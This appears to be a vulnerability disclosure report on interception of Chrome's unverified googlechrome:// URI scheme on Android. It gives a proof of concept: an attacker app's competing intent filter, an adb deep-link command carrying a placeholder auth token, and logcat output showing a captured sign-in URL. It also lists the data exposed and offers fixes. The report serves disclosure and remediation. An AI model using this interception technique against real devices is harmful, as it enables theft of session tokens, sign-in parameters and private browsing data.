# Google Chrome — Browsing Intent Interception via Unverified `googlechrome://` Custom URI Scheme

## Summary

Google Chrome (`com.android.chrome`) registers BROWSABLE intent filters for the custom URI scheme `googlechrome://` without App Link verification. A zero-permission attacker app can register a competing intent filter, causing Android to display a disambiguation chooser when any app or web page uses `googlechrome://` to open a URL in Chrome. If the user selects the attacker app, the full destination URL including all query parameters (authentication tokens, session IDs, search queries, account identifiers) is exfiltrated.

## Severity: HIGH

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: User must select attacker app from disambiguation chooser
- **CIA impact**: Confidentiality (destination URLs, authentication flow parameters, search queries, browsing intent leaked to zero-permission attacker)

## Affected Components

- **Package**: `com.android.chrome` (Google Chrome)
- **Activity**: `com.google.android.apps.chrome.IntentDispatcher`
- **Scheme**: `googlechrome://`

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="googlechrome" />
    <data android:scheme="http" />
    <data android:scheme="https" />
    <data android:scheme="about" />
</intent-filter>
```

**No `android:autoVerify="true"` is present on this filter.** Since `googlechrome://` is a custom scheme (not `https://`), App Link verification cannot protect it. While http/https in the same filter are protected by Chrome's verified App Links, the `googlechrome://` scheme remains interceptable.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (com.vrp.zeroperm)

Zero-permission app with competing intent filter:

```xml
<activity android:name=".OAuthInterceptActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="googlechrome" />
    </intent-filter>
</activity>
```

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions
2. Trigger a Chrome deep link (e.g., from another app trying to open a URL in Chrome):
   ```
   adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
     -d "googlechrome://https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&token=AUTH_SECRET_TOKEN"
   ```
3. Android displays "Open with" chooser showing "ZeroPerm" and "Chrome"
4. If user selects ZeroPerm, the full destination URL and all parameters are captured

### Runtime Proof (logcat)

```
W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: googlechrome://https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn
W OAUTH_INTERCEPT: [+] Param: flowName = GlifWebSignIn
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===
```

## Leaked Data

The `googlechrome://` scheme is used by Android apps and web pages to force a URL to open in Chrome. Any URL opened via this scheme is fully visible to the intercepting app:

| Scenario | Data Exposed |
|----------|-------------|
| Google Sign-In redirect | `accounts.google.com` URL with OAuth flow name, client ID, redirect URI |
| Banking/finance link | Full URL including account identifiers, session tokens |
| Search query | `google.com/search?q=...` revealing private search terms |
| Enterprise SSO | Corporate authentication URLs with SAML/OIDC parameters |
| Medical/health portal | Health system URLs revealing provider, appointment, patient portal access |
| Private browsing intent | Any URL the user intended to open in Chrome |

## Impact

### Confidentiality
- **Browsing intent profiling**: Attacker learns every URL the user attempts to open via `googlechrome://`, revealing their browsing patterns, interests, and online activities
- **Authentication parameter theft**: OAuth flow parameters (client_id, redirect_uri, state, nonce) from Google Sign-In and third-party authentication flows are leaked
- **Session token exposure**: URLs containing session tokens, API keys, or temporary authentication codes in query parameters are captured
- **Search query leakage**: If Chrome is opened with a search URL, the user's private search queries are revealed

### Integrity
- **Navigation hijacking**: The attacker intercepts the deep link, preventing Chrome from loading the intended URL. The attacker can redirect the user to a phishing page mimicking the intended destination

## Attack Scenario

1. User has a banking app that uses `googlechrome://` to open the bank's login page in Chrome
2. Attacker's zero-permission app is installed on the device (e.g., from a free game download)
3. When the banking app triggers `googlechrome://https://bank.example.com/login?session=TOKEN123`, the chooser appears
4. If the user selects the attacker app (or if Android auto-resolves to it), the bank URL and session token are exfiltrated
5. Attacker uses the session token for unauthorized access

## Recommended Fix

1. **Deprecate `googlechrome://` in favor of `https://` App Links** — use `https://` URLs with `autoVerify=true` and proper Digital Asset Links
2. **Validate the caller package** before processing `googlechrome://` intents using `Activity.getCallingPackage()` or `Activity.getReferrer()`
3. **Remove `BROWSABLE` category** from the `googlechrome://` filter if it is not intended for web-initiated navigation

## Files Attached

- `poc.apk` — Zero-permission PoC app (v1.53)
- `screen_chrome_chooser.png` — Chooser showing ZeroPerm alongside Chrome
- `screen_chrome_data_capture.png` — ZeroPerm displaying captured googlechrome:// URL data
